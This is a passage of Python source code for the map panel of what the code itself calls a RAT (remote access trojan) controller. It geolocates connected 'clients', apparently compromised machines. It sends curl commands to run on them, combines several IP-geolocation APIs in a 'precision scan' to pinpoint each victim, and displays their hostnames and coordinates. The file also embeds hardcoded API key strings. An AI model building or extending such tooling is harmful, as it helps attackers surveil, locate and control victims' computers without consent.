        """Update all map buttons to match the current theme"""
        if hasattr(self, 'map_buttons') and len(self.map_buttons) > 0:
            theme = self.get_theme_colors()
            
            for btn in self.map_buttons:
                # Regular button styling
                btn.configure(
                    fg_color=theme["button_color"],
                    hover_color=theme["hover_color"],
                    text_color=theme["fg_color"],
                    border_color=theme["border_color"] if "border_color" in theme else None,
                    border_width=1 if "border_color" in theme else 0,
                    corner_radius=0  # Ensure square corners
                )
                
    def setup_tkinter_map(self):
        """Set up the map using tkintermapview library with enhanced features"""
        import tkintermapview
        
        # Get theme colors
        theme = self.get_theme_colors()
        
        # Create the map widget with brutalist styling (no rounded corners)
        self.map_widget = tkintermapview.TkinterMapView(self.map_container, 
                                                     width=800, 
                                                     height=600, 
                                                     corner_radius=0)  # Square corners
        self.map_widget.pack(fill="both", expand=True)
        
        # Set default position (world view)
        self.map_widget.set_position(20.0, 0.0)  # Center at equator
        self.map_widget.set_zoom(2)  # Zoom level for world view
        
        # Set up map marker click event
        self.map_widget.add_right_click_menu_command("VIEW CLIENT DETAILS",  # All caps
                                                   self.show_client_details,
                                                   pass_coords=True)
        
        # Set up enhanced marker system
        self.markers = {}  # Store references to markers for updates
        
        # Add menu commands for enhanced functionality with brutalist naming
        self.map_widget.add_right_click_menu_command("GET PRECISE LOCATION",  # All caps
                                                   self.get_precise_location,
                                                   pass_coords=True)
        self.map_widget.add_right_click_menu_command("COPY COORDINATES",  # All caps
                                                   self.copy_coordinates,
                                                   pass_coords=True)
    
    def setup_web_map(self):
        """Set up the map using a web-based approach with tkinter HTML viewer"""
        import tkinter as tk
        
        # Get theme colors
        theme = self.get_theme_colors()
        
        try:
            from tkinterweb import HtmlFrame
            
            # Create HTML frame with brutalist styling
            self.html_frame = HtmlFrame(self.map_container, messages_enabled=False)
            self.html_frame.pack(fill="both", expand=True)
            
            # Generate and load a basic map with leaflet.js
            map_html = self.generate_web_map_html()
            self.html_frame.load_html(map_html)
            self.map_type = "web"
            
        except ImportError:
            # Show error message if tkinterweb is not available with brutalist styling
            error_label = tk.Label(self.map_container, 
                                 text="MAP LIBRARIES NOT AVAILABLE\n\nPlease install:\npip install tkintermapview\nor\npip install tkinterweb",  # All caps header
                                 bg=theme["bg_color"],
                                 fg=theme["fg_color"],
                                 justify=tk.CENTER,
                                 font=("Arial", 12, "bold"))
            error_label.pack(fill=tk.BOTH, expand=True)
            self.map_type = "none"
    
    def generate_web_map_html(self):
        """Generate HTML for a web-based map using Leaflet.js with enhanced features and brutalist styling"""
        # Get theme colors
        theme = self.get_theme_colors()
        
        # Extract theme colors for use in HTML
        bg_color = theme["bg_color"]
        fg_color = theme["fg_color"]
        accent_color = theme["accent_color"]
        danger_color = theme["danger_color"]
        success_color = theme["success_color"]
        warning_color = theme["warning_color"]
        
        # Base HTML template with Leaflet.js and brutalist styling
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Enhanced Client Location Map</title>
            <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
            <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
            <style>
                body {{ 
                    margin: 0; 
                    padding: 0; 
                    background-color: {bg_color}; 
                    color: {fg_color}; 
                    font-family: Arial, sans-serif; 
                }}
                #map {{ 
                    height: 100vh; 
                    width: 100%; 
                }}
                .info-window {{ 
                    max-width: 300px; 
                    background-color: {bg_color}; 
                    color: {fg_color}; 
                    border: 1px solid {accent_color}; 
                    padding: 0; 
                }}
                .info-window h3 {{ 
                    background-color: {accent_color}; 
                    color: #000000; 
                    margin: 0; 
                    padding: 10px; 
                }}
                .info-window p {{ 
                    margin: 5px 10px; 
                    padding: 0; 
                }}
                .client-marker {{ 
                    text-align: center; 
                }}
                .high-precision {{ 
                    border: 3px solid {success_color}; 
                }}
                .medium-precision {{ 
                    border: 3px solid {warning_color}; 
                }}
                .low-precision {{ 
                    border: 3px solid {danger_color}; 
                }}
            </style>
        </head>
        <body>
            <div id="map"></div>
            <script>
                // Initialize the map
                var map = L.map('map').setView([20, 0], 2);
                
                // Add the tile layer (OpenStreetMap by default)
                L.tileLayer('https://{{s}}.tile.openstreetmap.org/{{z}}/{{x}}/{{y}}.png', {{
                    attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
                }}).addTo(map);
                
                // Add circle for accuracy visualization
                function addAccuracyCircle(lat, lng, accuracy, client_id) {{
                    var circle = L.circle([lat, lng], {{
                        color: accuracy < 1000 ? '{success_color}' : accuracy < 5000 ? '{warning_color}' : '{danger_color}',
                        fillColor: accuracy < 1000 ? '{success_color}' : accuracy < 5000 ? '{warning_color}' : '{danger_color}',
                        fillOpacity: 0.1,
                        radius: accuracy || 10000
                    }}).addTo(map);
                    
                    // Store circle reference for updates
                    window['circle_' + client_id] = circle;
                }}
                
                // Add client markers
                """
        
        # Add client markers to the map with enhanced features
        for client_id, location in self.client_locations.items():
            if 'lat' in location and 'lon' in location:
                # Skip if coordinates are invalid (0,0 usually indicates failed geolocation)
                if location['lat'] == 0 and location['lon'] == 0:
                    continue
                
                # Create a popup with client info
                info = location.get('info', {})
                ip = info.get('ip', 'Unknown')
                hostname = info.get('hostname', 'Unknown')
                location_name = info.get('location', 'Unknown')
                accuracy = info.get('accuracy', 10000)  # Default to 10km if unknown
                confidence = info.get('confidence', 'low')
                
                # Determine marker color based on confidence using theme colors
                if confidence == 'high':
                    color = theme["success_color"]
                elif confidence == 'medium':
                    color = theme["warning_color"]
                else:
                    color = theme["danger_color"]
                
                # Add enhanced marker with detailed popup using brutalist styling
                html += f"""
                var marker_{client_id} = L.marker([{location['lat']}, {location['lon']}], {{
                    icon: L.divIcon({{
                        className: 'client-marker {confidence}-precision',
                        html: '<div style="background-color: {color}; width: 12px; height: 12px; border: 2px solid #000000;"></div>',
                        iconSize: [16, 16],
                        iconAnchor: [8, 8]
                    }})
                }}).addTo(map);
                
                marker_{client_id}.bindPopup(`
                    <div class="info-window">
                        <h3>CLIENT ID: {client_id}</h3>
                        <p><strong>IP:</strong> {ip}</p>
                        <p><strong>HOSTNAME:</strong> {hostname}</p>
                        <p><strong>LOCATION:</strong> {location_name}</p>
                        <p><strong>PRECISION:</strong> {confidence.upper()}</p>
                        <p><strong>COORDINATES:</strong> {location['lat']:.6f}, {location['lon']:.6f}</p>
                    </div>
                `);
                
                addAccuracyCircle({location['lat']}, {location['lon']}, {accuracy}, {client_id});
                """
        
        # Add functions for interaction with brutalist naming
        html += """
                // Function to zoom to a location
                function zoomToLocation(lat, lng, zoom) {
                    map.setView([lat, lng], zoom || 12);
                }
                
                // Function to update a marker
                function updateMarker(client_id, lat, lng, accuracy, popupContent) {
                    var marker = window['marker_' + client_id];
                    var circle = window['circle_' + client_id];
                    
                    if (marker) {
                        marker.setLatLng([lat, lng]);
                        if (popupContent) {
                            marker.bindPopup(popupContent);
                        }
                    }
                    
                    if (circle) {
                        circle.setLatLng([lat, lng]);
                        circle.setRadius(accuracy || 10000);
                        
                        // Update circle color based on accuracy
                        var color = accuracy < 1000 ? '""" + theme["success_color"] + """' : accuracy < 5000 ? '""" + theme["warning_color"] + """' : '""" + theme["danger_color"] + """';
                        circle.setStyle({
                            color: color,
                            fillColor: color
                        });
                    }
                }
            </script>
        </body>
        </html>
        """
        
        return html
    
    def perform_precision_scan(self):
        """Performs a precision scan to improve location accuracy for all clients"""
        import threading
        
        self.log_message("Starting precision scan for all clients...")
        
        # Get all connected clients and schedule precision scans
        for client_id, location in list(self.client_locations.items()):
            if 'info' not in location or 'ip' not in location['info']:
                continue
                
            ip = location['info']['public_ip']
            
            # Start a thread for each client to avoid blocking the UI
            thread = threading.Thread(
                target=self.get_precise_location_for_ip,
                args=(ip, client_id, True)
            )
            thread.daemon = True
            thread.start()
    
    def get_precise_location_for_ip(self, ip, client_id, update_map=True):
        """Get high-precision location data for an IP address"""
        try:
            self.log_message(f"Performing precision scan for client {client_id} ({ip})...")
            
            # Try multiple services and combine results for higher precision
            location_data = []
            confidence = "low"
            accuracy = 10000  # Default 10km radius
            
            # Try all available services
            ipstack_data = self.get_ipstack_location(ip)
            if ipstack_data and self.is_valid_location(ipstack_data):
                location_data.append(ipstack_data)
                
            ipinfo_data = self.get_ipinfo_location(ip)
            if ipinfo_data and self.is_valid_location(ipinfo_data):
                location_data.append(ipinfo_data)
                
            ipgeo_data = self.get_ipgeolocation_location(ip)
            if ipgeo_data and self.is_valid_location(ipgeo_data):
                location_data.append(ipgeo_data)
                
            ipapi_data = self.get_ipapi_location(ip)
            if ipapi_data and self.is_valid_location(ipapi_data):
                location_data.append(ipapi_data)
            
            # If we have multiple data sources, check for consensus
            if len(location_data) >= 3:
                # Compare coordinates between sources for consistency
                avg_lat, avg_lon, data_variance = self.calculate_location_consensus(location_data)
                
                if data_variance < 0.01:  # Locations agree closely
                    confidence = "high"
                    accuracy = self.get_best_accuracy(location_data)
                    self.log_message(f"High confidence location for {ip}: consensus between {len(location_data)} sources")
                else:
                    confidence = "medium"
                    accuracy = 5000  # ~5km radius
                    self.log_message(f"Medium confidence location for {ip}: sources disagree slightly")
            
            elif len(location_data) >= 1:
                # Single data source
                avg_lat = location_data[0].get('latitude')
                avg_lon = location_data[0].get('longitude')
                confidence = "medium"
                accuracy = self.get_best_accuracy(location_data)
                self.log_message(f"Medium confidence location for {ip}: single source with {accuracy}m accuracy")
            
            else:
                # No good data
                self.log_message(f"Could not obtain precise location for {ip}", is_error=True)
                return
            
            # Find the best location info (most complete)
            best_location_info = self.get_most_complete_location_info(location_data)
            
            # Update the client location with improved data
            if client_id in self.client_locations:
                self.client_locations[client_id]["lat"] = avg_lat
                self.client_locations[client_id]["lon"] = avg_lon
                
                # Update info
                if 'info' not in self.client_locations[client_id]:
                    self.client_locations[client_id]["info"] = {}
                
                self.client_locations[client_id]["info"]["confidence"] = confidence
                self.client_locations[client_id]["info"]["accuracy"] = accuracy
                
                # Add detailed location info
                for key in best_location_info:
                    if key not in ['latitude', 'longitude']:
                        self.client_locations[client_id]["info"][key] = best_location_info[key]
                
                # Update location string
                location_parts = []
                if best_location_info.get('city'):
                    location_parts.append(best_location_info['city'])
                if best_location_info.get('region_name'):
                    location_parts.append(best_location_info['region_name'])
                if best_location_info.get('country_name'):
                    location_parts.append(best_location_info['country_name'])
                
                if location_parts:
                    self.client_locations[client_id]["info"]["location"] = ", ".join(location_parts)
                
                # Update the cache
                self.ip_cache[ip] = self.client_locations[client_id].copy()
                
                # Update map if requested
                if update_map:
                    self.refresh_map()
                
                self.log_message(f"Updated location for {ip} with {confidence} confidence")
                
        except Exception as e:
            self.log_message(f"Error in precision scan for {ip}: {e}", is_error=True)
    
    def get_best_accuracy(self, location_data_list):
        """Get the best accuracy value from multiple location sources"""
        best_accuracy = 10000  # Default 10km
        
        for data in location_data_list:
            accuracy = data.get('accuracy', 10000)
            if accuracy and accuracy < best_accuracy:
                best_accuracy = accuracy
        
        return best_accuracy
    
    def calculate_location_consensus(self, location_data_list):
        """Calculate average location and variance from multiple data sources"""
        # Extract all lat/lon pairs
        coordinates = []
        for data in location_data_list:
            lat = data.get('latitude')
            lon = data.get('longitude')
            if lat is not None and lon is not None:
                coordinates.append((lat, lon))
        
        if not coordinates:
            return 0, 0, 999
            
        # Calculate average
        avg_lat = sum(coord[0] for coord in coordinates) / len(coordinates)
        avg_lon = sum(coord[1] for coord in coordinates) / len(coordinates)
        
        # Calculate variance (measure of agreement between sources)
        import math
        total_variance = 0
        for lat, lon in coordinates:
            # Simplified distance calculation (not accounting for Earth's curvature)
            variance = math.sqrt((lat - avg_lat)**2 + (lon - avg_lon)**2)
            total_variance += variance
            
        avg_variance = total_variance / len(coordinates) if coordinates else 999
        
        return avg_lat, avg_lon, avg_variance
    
    def get_most_complete_location_info(self, location_data_list):
        """Find the most complete location info entry from available sources"""
        if not location_data_list:
            return {}
            
        # Use a scoring system to determine the most complete entry
        best_score = -1
        best_data = None
        
        for data in location_data_list:
            score = 0
            
            # Check for presence of important fields
            important_fields = [
                'city', 'region_name', 'country_name', 'zip', 
                'isp', 'timezone', 'accuracy'
            ]
            
            for field in important_fields:
                if field in data and data[field]:
                    score += 1
            
            # Extra points for accuracy information
            if 'accuracy' in data and data['accuracy'] < 5000:
                score += 2
                
            if score > best_score:
                best_score = score
                best_data = data
        
        return best_data or location_data_list[0]
    
    def is_valid_location(self, location_data):
        """Check if location data contains valid coordinates"""
        if not location_data:
            return False
            
        lat = location_data.get('latitude')
        lon = location_data.get('longitude')
        
        # Check if coordinates exist and are not 0,0 (often indicates failed lookup)
        if lat is None or lon is None:
            return False
            
        if lat == 0 and lon == 0:
            return False
            
        # Check if coordinates are within valid range
        if abs(lat) > 90 or abs(lon) > 180:
            return False
            
        return True
    
    def get_precise_location(self, coordinates=None):
        """Get precise location for client nearest to the given coordinates"""
        if not coordinates:
            return
            
        lat, lon = coordinates
        client_id = self.find_closest_client(lat, lon)
        
        if client_id is None:
            self.log_message("No client found near this location")
            return
            
        # Get client IP
        client_info = self.client_locations.get(client_id, {}).get('info', {})
        self.log_message(client_info)
        ip = client_info.get('ip')
        if not ip:
            self.log_message("No IP address found for selected client")
            return
            
        # Perform precision scan for this client
        self.get_precise_location_for_ip(ip, client_id)
        
        # Update display
        self.show_client_details(coordinates)
    
    def find_closest_client(self, lat, lon):
        """Find the client ID closest to the given coordinates"""
        closest_client = None
        min_distance = float('inf')
        
        for client_id, location in self.client_locations.items():
            if 'lat' in location and 'lon' in location:
                # Calculate distance (simple Euclidean distance is sufficient for this purpose)
                distance = ((location['lat'] - lat) ** 2 + (location['lon'] - lon) ** 2) ** 0.5
                
                if distance < min_distance:
                    min_distance = distance
                    closest_client = client_id
        
        # Only return if the client is reasonably close (within ~50km)
        if min_distance < 0.5:  # Approximately 50km at the equator
            return closest_client
        
        return None
    
    def copy_coordinates(self, coordinates=None):
        """Copy coordinates to clipboard"""
        if not coordinates:
            return
            
        lat, lon = coordinates
        
        # Format coordinates with high precision
        coord_string = f"{lat:.6f}, {lon:.6f}"
        
        # Copy to clipboard
        try:
            import tkinter as tk
            self.root = tk.Tk()
            self.root.withdraw()
            self.root.clipboard_clear()
            self.root.clipboard_append(coord_string)
            self.root.update()
            self.root.destroy()
            
            self.log_message(f"Coordinates copied to clipboard: {coord_string}")
        except Exception as e:
            self.log_message(f"Error copying to clipboard: {e}", is_error=True)
    
    def refresh_map(self):
        """Refresh the map with current client locations"""
        # First, update the locations of all connected clients
        self.update_all_client_locations()
        
        # Then update the map display
        if self.map_type == "tkinter":
            self.update_tkinter_map()
        elif self.map_type == "web":
            self.update_web_map()
        else:
            # No map loaded yet
            pass
    
    def update_all_client_locations(self):
        """Update the geographic locations of all connected clients with enhanced precision"""
        import threading
        import socket
        import ipaddress
        
        # Clear existing locations for current clients
        self.client_locations = {}
        
        # Get all connected clients
        for addr, (client_id, conn) in self.rat_app.clients.items():
            # Extract IP address
            ip = addr[0]
            
            # Skip invalid IPs
            if not self.is_valid_ip(ip):
                self.log_message(f"Invalid IP address for client {client_id}: {ip}", is_error=True)
                continue
            
            # Check if IP is local or private
            is_local_ip = self.is_local_ip(ip)
            
            if is_local_ip:
                if self.allow_local_ip_lookup:
                    try:
                        # For local clients, try to get public IP by asking them directly
                        if self.debug:
                            self.log_message(f"Attempting to get public IP for local client {client_id} at {ip}")
                            
                        public_ip = self.get_client_public_ip(conn)
                        if public_ip and public_ip != ip and self.is_valid_ip(public_ip):
                            # Log the public IP found
                            if self.debug:
                                self.log_message(f"Found public IP {public_ip} for client on local IP {ip}")
                                
                            self.rat_app.log(f"Using public IP {public_ip} for geolocation of client {client_id}")
                            
                            # Check if we have this public IP in the cache
                            if public_ip in self.ip_cache and not self.is_cache_expired(public_ip):
                                self.client_locations[client_id] = self.ip_cache[public_ip].copy()
                                self.client_locations[client_id]["info"]["hostname"] = self.get_client_hostname(conn)
                                self.client_locations[client_id]["info"]["ip"] = ip  # Keep the original IP
                                self.client_locations[client_id]["info"]["public_ip"] = public_ip  # Store public IP too
                            else:
                                # Start a thread to get the location of the public IP
                                thread = threading.Thread(target=self.get_location_for_client, 
                                                      args=(public_ip, client_id, conn))
                                thread.daemon = True
                                thread.start()
                            continue
                        else:
                            if self.debug:
                                self.log_message(f"Could not determine public IP for local client {client_id}")
                    except Exception as e:
                        if self.debug:
                            self.log_message(f"Error getting public IP for {client_id}: {e}", is_error=True)
                
                # Use different handling strategies based on precision level
                precision_level = self.precision_var.get().lower()
                
                if precision_level == "high":
                    # For high precision, try external IP detection services
                    self.handle_local_client_high_precision(client_id, ip, conn)
                elif precision_level == "approximate":
                    # For approximate, just use a placeholder location
                    self.handle_local_client_low_precision(client_id, ip, conn)
                else:
                    # Standard precision - use Google HQ (or similar neutral location)
                    self.handle_local_client_standard_precision(client_id, ip, conn)
            else:
                # Regular public IP - check cache first
                if ip in self.ip_cache and not self.is_cache_expired(ip):
                    self.client_locations[client_id] = self.ip_cache[ip].copy()
                    self.client_locations[client_id]["info"]["hostname"] = self.get_client_hostname(conn)
                else:
                    # Start a thread to get the location to avoid blocking
                    thread = threading.Thread(target=self.get_location_for_client, 
                                           args=(ip, client_id, conn))
                    thread.daemon = True
                    thread.start()
    
    def handle_local_client_high_precision(self, client_id, ip, conn):
        """Handle local IP client with high precision strategy"""
        # Try various methods to determine approximate location
        
        # Method 1: Try browser geolocation API via client
        # Method 2: Try Wi-Fi geolocation database lookup
        # Method 3: Try carrier IP database
        
        # For now, fall back to ISP location or regional approximation
        import random
        
        # Use locally-relevant coordinates based on system locale or other hints
        try:
            import locale
            country_code = locale.getdefaultlocale()[0].split('_')[1]
            country_coords = self.get_country_center(country_code)
            
            if country_coords:
                lat, lon = country_coords
                # Add some randomness within the country
                lat += random.uniform(-0.5, 0.5)
                lon += random.uniform(-0.5, 0.5)
                
                self.client_locations[client_id] = {
                    "lat": lat,
                    "lon": lon,
                    "info": {
                        "ip": ip,
                        "hostname": self.get_client_hostname(conn),
                        "location": f"Approximate location in {self.get_country_name(country_code)}",
                        "confidence": "low",
                        "accuracy": 50000,  # 50km accuracy
                        "note": "Local IP - approximated based on system locale"
                    }
                }
                return
        except Exception as e:
            self.log_message(f"Error in high-precision local IP handling: {e}", is_error=True)
        
        # Fall back to standard precision if all else fails
        self.handle_local_client_standard_precision(client_id, ip, conn)
    
    def handle_local_client_standard_precision(self, client_id, ip, conn):
        """Handle local IP client with standard precision strategy"""
        # Use a neutral location like Google HQ
        self.client_locations[client_id] = {
            "lat": 37.422,  # Google HQ latitude
            "lon": -122.084,  # Google HQ longitude
            "info": {
                "ip": ip,
                "hostname": self.get_client_hostname(conn),
                "location": "Local Network (Approximate)",
                "confidence": "low",
                "accuracy": 10000,  # 10km accuracy
                "note": "Local IP - location is approximate"
            }
        }
        
        if self.debug:
            self.log_message(f"Using standard precision location for local client {client_id}")
    
    def handle_local_client_low_precision(self, client_id, ip, conn):
        """Handle local IP client with low precision strategy"""
        # Use zeros which will display as 'unknown location'
        self.client_locations[client_id] = {
            "lat": 0,
            "lon": 0,
            "info": {
                "ip": ip,
                "hostname": self.get_client_hostname(conn),
                "location": "Local Network (Unknown)",
                "confidence": "unknown",
                "accuracy": 100000,  # 100km accuracy
                "note": "Local IP - location unknown"
            }
        }
        
        if self.debug:
            self.log_message(f"Using low precision location for local client {client_id}")
    
    def is_valid_ip(self, ip):
        """Check if an IP address is valid"""
        try:
            import ipaddress
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False
    
    def is_local_ip(self, ip):
        """Check if an IP address is local/private"""
        try:
            import ipaddress
            ip_obj = ipaddress.ip_address(ip)
            
            # Check for loopback
            if ip_obj.is_loopback:
                return True
                
            # Check for private addresses
            if ip_obj.is_private:
                return True
                
            # Check for specific ranges
            if ip.startswith("192.168.") or ip.startswith("10.") or ip.startswith("172.16."):
                return True
            return False
        except ValueError:
            return False
    
    def is_cache_expired(self, ip):
        """Check if cached IP location data has expired"""
        if ip not in self.cache_expiry:
            return True
            
        import time
        current_time = time.time()
        
        # Return True if cache has expired
        return current_time > self.cache_expiry[ip]
    
    def get_client_hostname(self, conn):
        """Get the hostname for a client connection"""
        try:
            # Try to get hostname using the RAT command
            if hasattr(self.rat_app, 'getHostName'):
                return self.rat_app.getHostName(conn)
            else:
                return "Unknown"
        except:
            return "Unknown"
    
    def get_client_public_ip(self, conn):
        """Attempt to get the client's public IP address using multiple services"""
        try:
            # Try different IP detection services in order
            services = [
                "https://ipinfo.io/ip",
                "https://icanhazip.com",
                "https://ifconfig.me/ip"
            ]
            
            # Send a special command to the client to get its public IP
            if hasattr(self.rat_app, 'send_cmd'):
                for service in services:
                    try:
                        # Use curl to get the IP from the service
                        command = f"curl -s {service}"
                        result, _ = self.rat_app.send_cmd(conn, command)
                        public_ip = result.decode().strip()
                        
                        # Validate the IP
                        if self.is_valid_ip(public_ip) and not self.is_local_ip(public_ip):
                            return public_ip
                    except Exception as e:
                        if self.debug:
                            self.log_message(f"Error using {service}: {e}", is_error=True)
                        continue
            
            # If we get here, all services failed
            return None
        except Exception as e:
            self.log_message(f"Error getting client's public IP: {e}", is_error=True)
            return None
    
    def get_location_for_client(self, ip, client_id, conn):
        """Get geographic location for a client IP and update the map"""
        import time
        
        # Try to get location data
        location_data = self.get_ip_location(ip)
        
        if location_data and 'latitude' in location_data and 'longitude' in location_data:
            # Validate coordinates (some APIs return 0,0 for unknown locations)
            lat = location_data['latitude']
            lon = location_data['longitude']
            
            # If coordinates are 0,0 or None, try backup method
            if (lat == 0 and lon == 0) or lat is None or lon is None:
                # Try backup geolocation method
                backup_location = self.get_backup_location(ip)
                if backup_location:
                    lat = backup_location['latitude']
                    lon = backup_location['longitude']
                    # Update other location data if available
                    for key in backup_location:
                        if key not in location_data or not location_data[key]:
                            location_data[key] = backup_location[key]
            
            # Enhance with additional data like accuracy and confidence
            confidence = "medium"  # Default confidence
            accuracy = location_data.get('accuracy', 10000)  # Default 10km radius
            
            # If we have city-level data, improve confidence and accuracy
            if location_data.get('city') and location_data.get('region_name'):
                confidence = "medium"
                accuracy = 5000  # ~5km radius for city-level
            
            # If we have latitude/longitude with high precision
            if lat is not None and lon is not None and accuracy < 1000:
                confidence = "high"
            
            # If we have valid coordinates, store the location
            if lat and lon and not (lat == 0 and lon == 0):
                # Generate a formatted location string
                location_str = ""
                if location_data.get('city'):
                    location_str += location_data.get('city')
                if location_data.get('region_name'):
                    if location_str:
                        location_str += ", "
                    location_str += location_data.get('region_name')
                if location_data.get('country_name'):
                    if location_str:
                        location_str += ", "
                    location_str += location_data.get('country_name')
                
                # Store in the cache and client locations dict
                self.ip_cache[ip] = {
                    "lat": lat,
                    "lon": lon,
                    "info": {
                        "ip": ip,
                        "hostname": self.get_client_hostname(conn),
                        "location": location_str,
                        "country_code": location_data.get('country_code', ''),
                        "region": location_data.get('region_name', ''),
                        "city": location_data.get('city', ''),
                        "zip": location_data.get('zip', ''),
                        "timezone": location_data.get('time_zone', {}).get('name', ''),
                        "isp": location_data.get('isp', ''),
                        "confidence": confidence,
                        "accuracy": accuracy,
                        "source": location_data.get('source', 'ipstack')
                    }
                }
                
                # Set cache expiration time
                import time
                self.cache_expiry[ip] = time.time() + self.cache_expiration_time
                
                # Copy to client locations
                self.client_locations[client_id] = self.ip_cache[ip].copy()
                
                # Update the map display after a short delay
                time.sleep(0.5)  # Avoid too many rapid updates if multiple threads
                self.map_frame.after(0, self.refresh_map)
            else:
                # If we still don't have valid coordinates, log the issue
                self.log_message(f"Unable to get valid coordinates for IP: {ip}", is_error=True)
    
    def log_message(self, msg, is_error=False):
        """Add a message to the log display"""
        import tkinter as tk
        import time
        
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        log_entry = f"[{timestamp}] {str(msg)}"
        
        # Update log in UI
        self.log_text.config(state=tk.NORMAL)
        
        # Add color tag if it's an error
        if is_error:
            self.log_text.insert(tk.END, log_entry + "\n", "error")
            # Configure the error tag if it doesn't exist
            try:
                self.log_text.tag_config("error", foreground="red")
            except:
                pass
        else:
            self.log_text.insert(tk.END, log_entry + "\n")
            
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)
        
        # Also log to the main application log if available
        if hasattr(self.rat_app, 'log'):
            self.rat_app.log(msg)
    
    def get_ip_location(self, ip):
        """Get geographic location data for an IP address using multiple external APIs"""
        import requests
        
        # Create a base default response
        default_response = {
            'latitude': None,
            'longitude': None,
            'country_name': '',
            'country_code': '',
            'region_name': '',
            'city': '',
            'zip': '',
            'time_zone': {'name': ''},
            'isp': '',
            'accuracy': 10000,  # Default 10km accuracy
            'source': 'default'
        }
        
        # Try ipstack API first if available
        if self.ipstack_api_key != "0c84ae78bf00f2eeb7280af1803f93d5" and self.services_status['ipstack']['available']:
            try:
                protocol = "https" if self.use_https else "http"
                response = requests.get(
                    f"{protocol}://api.ipstack.com/{ip}?access_key={self.ipstack_api_key}&fields=ip,latitude,longitude,country_name,country_code,region_name,city,zip,location",
                    timeout=5
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if 'latitude' in data and 'longitude' in data:
                        # Convert response to standard format
                        result = default_response.copy()
                        result.update({
                            'latitude': data.get('latitude'),
                            'longitude': data.get('longitude'),
                            'country_name': data.get('country_name', ''),
                            'country_code': data.get('country_code', ''),
                            'region_name': data.get('region_name', ''),
                            'city': data.get('city', ''),
                            'zip': data.get('zip', ''),
                            'accuracy': data.get('location', {}).get('accuracy_radius', 10000) * 1000,  # Convert km to m
                            'source': 'ipstack'
                        })
                        
                        # Check if we have timezone info
                        if 'location' in data and 'time_zone' in data['location']:
                            result['time_zone'] = {'name': data['location']['time_zone']}
                        
                        # Check for valid lat/long (not 0,0)
                        if (result['latitude'] != 0 or result['longitude'] != 0):
                            self.services_status['ipstack']['available'] = True
                            self.services_status['ipstack']['error_count'] = 0
                            return result
            except Exception as e:
                self.log_message(f"Error with ipstack API: {e}", is_error=True)
                self.services_status['ipstack']['available'] = False
                self.services_status['ipstack']['last_error'] = str(e)
                self.services_status['ipstack']['error_count'] += 1
        
        # Try ipinfo.io if available
        if self.ipinfo_token != "58950d8a1c1383" and self.services_status['ipinfo']['available']:
            try:
                response = requests.get(
                    f"https://ipinfo.io/{ip}/json?token={self.ipinfo_token}",
                    timeout=5
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if 'loc' in data and data['loc']:
                        try:
                            lat, lon = data['loc'].split(',')
                            lat, lon = float(lat), float(lon)
                            
                            # Convert to standard format
                            result = default_response.copy()
                            result.update({
                                'latitude': lat,
                                'longitude': lon,
                                'country_name': data.get('country', ''),
                                'country_code': data.get('country', ''),
                                'region_name': data.get('region', ''),
                                'city': data.get('city', ''),
                                'zip': data.get('postal', ''),
                                'time_zone': {'name': data.get('timezone', '')},
                                'isp': data.get('org', ''),
                                'accuracy': 5000,  # ipinfo is usually city-level accurate (~5km)
                                'source': 'ipinfo'
                            })
                            
                            self.services_status['ipinfo']['available'] = True
                            self.services_status['ipinfo']['error_count'] = 0
                            return result
                        except:
                            pass
            except Exception as e:
                self.log_message(f"Error with ipinfo.io: {e}", is_error=True)
                self.services_status['ipinfo']['available'] = False
                self.services_status['ipinfo']['last_error'] = str(e)
                self.services_status['ipinfo']['error_count'] += 1
        
        # Try IP-API (free, but rate limited)
        if self.services_status['ipapi']['available']:
            try:
                response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    if data.get('status') == 'success':
                        # Convert to standard format
                        result = default_response.copy()
                        result.update({
                            'latitude': data.get('lat'),
                            'longitude': data.get('lon'),
                            'country_name': data.get('country', ''),
                            'country_code': data.get('countryCode', ''),
                            'region_name': data.get('regionName', ''),
                            'city': data.get('city', ''),
                            'zip': data.get('zip', ''),
                            'time_zone': {'name': data.get('timezone', '')},
                            'isp': data.get('isp', ''),
                            'accuracy': 5000,  # city-level accuracy
                            'source': 'ip-api.com'
                        })
                        
                        self.services_status['ipapi']['available'] = True
                        self.services_status['ipapi']['error_count'] = 0
                        return result
            except Exception as e:
                self.log_message(f"Error with ip-api.com: {e}", is_error=True)
                self.services_status['ipapi']['available'] = False
                self.services_status['ipapi']['last_error'] = str(e)
                self.services_status['ipapi']['error_count'] += 1
        
        # Try free geolocation-db.com service as last resort
        if self.services_status['freegeoip']['available']:
            try:
                response = requests.get(f"https://geolocation-db.com/json/{ip}", timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    if data.get('latitude') and data.get('longitude'):
                        # Convert to standard format
                        result = default_response.copy()
                        result.update({
                            'latitude': float(data.get('latitude')),
                            'longitude': float(data.get('longitude')),
                            'country_name': data.get('country_name', ''),
                            'country_code': data.get('country_code', ''),
                            'region_name': data.get('state', ''),
                            'city': data.get('city', ''),
                            'zip': data.get('postal', ''),
                            'time_zone': {'name': ''},
                            'isp': '',
                            'accuracy': 25000,  # lower accuracy for this free service
                            'source': 'geolocation-db.com'
                        })
                        
                        self.services_status['freegeoip']['available'] = True
                        self.services_status['freegeoip']['error_count'] = 0
                        return result
            except Exception as e:
                self.log_message(f"Error with geolocation-db.com: {e}", is_error=True)
                self.services_status['freegeoip']['available'] = False
                self.services_status['freegeoip']['last_error'] = str(e)
                self.services_status['freegeoip']['error_count'] += 1
        
        # Return None if all methods fail
        return None
    
    def get_backup_location(self, ip):
        """Use alternative geolocation services as backup"""
        import requests
        
        # First, try ipgeolocation.io if available
        if self.ipgeolocation_api_key != "df6c850929e54ae1801e2472127b1a8c" and self.services_status['ipgeolocation']['available']:
            try:
                response = requests.get(
                    f"https://api.ipgeolocation.io/ipgeo?apiKey={self.ipgeolocation_api_key}&ip={ip}",
                    timeout=5
                )
                
                if response.status_code == 200:
                    data = response.json()
